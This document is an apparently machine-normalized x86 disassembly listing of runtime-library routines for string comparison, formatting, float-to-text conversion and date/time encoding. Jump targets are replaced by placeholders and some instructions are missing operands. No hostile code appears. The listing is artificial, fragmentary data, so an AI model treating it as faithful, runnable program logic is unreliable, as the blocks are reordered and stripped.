mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408508
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408530
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408564
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40427c
push eax
mov eax ebx
call sub_40447c
mov edx eax
mov eax esi
pop ecx
call sub_408530
pop esi
pop ebx
retn
sub_408588
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_40447c
mov edx eax
mov ecx edi
mov eax ebx
call sub_408530
pop edi
pop esi
pop ebx
retn
sub_4085a8
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_4085cc
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_40860c
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408664
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_4086d8
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4084cc
mov esi eax
inc esi
mov eax esi
call sub_4086b8
mov ecx esi
mov edx ebx
call sub_4084f8
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408714
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40bdec
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_4084f8
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407aa4
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_40879c
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408af3
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_40887e
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_4088c6
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_40887e
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408790
pop edx
or edx edx
je r-xdata
sub_40887e
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408af3
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4088c6
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408af3
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408714
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_4088ed ]
mov ebx ecx
sub cl 0x44
je sub_407ebc
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_4041e4
jmp r-xdata
mov esi sub_404244
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_407ebc
sub cl 0x44
je sub_407e50
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_407e50
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407ebc
mov ecx 0x10
cmp bl 0x58
je sub_407e50
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40876c
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408cac
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407e50
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408b14
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4084cc
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_40879c
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408b54
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4084cc
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_40879c
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408ba8
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_40427c
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_40427c
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_40427c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_40879c
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_4040ac
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403fbc
mov eax esi
mov edx ebx
call sub_404608
mov eax [ ebp - 0x4 ]
call sub_40427c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_40879c
mov edx esi
xchg edx eax
call sub_404608
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408c68
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408cac
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_408f80
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408dab
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408db5
call sub_408dab
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408c68
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_408e11
call sub_408dab
call sub_408da2
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408da2
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408c68
retn
xor ecx ecx
sub_408e4d
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408da2
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408da2
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_408eb2
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_408f06
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_408e4d
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_408f80
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_408fad
jmp r-xdata
call sub_4090cf
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_408fad
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402dc8
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_4090cf
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_4091ac
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_409263
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_40926e
neg edx
mov ecx esi
call sub_40926e
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_409263
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_40928a
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402dc8
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_40926e
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_40928a
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_4092c0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408cac
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4040ac
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4092f0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408cac
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4040ac
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40933c
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40447c
mov edx esp
xor ecx ecx
call sub_4091ac
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409368
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40447c
mov edx esp
xor ecx ecx
call sub_4091ac
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4093b0
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_4093f4
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409464
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_4093b0
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407a88
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407a88
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407a88
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4094c0
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_4094fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_4094c0
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_4095c4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_4093b0
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
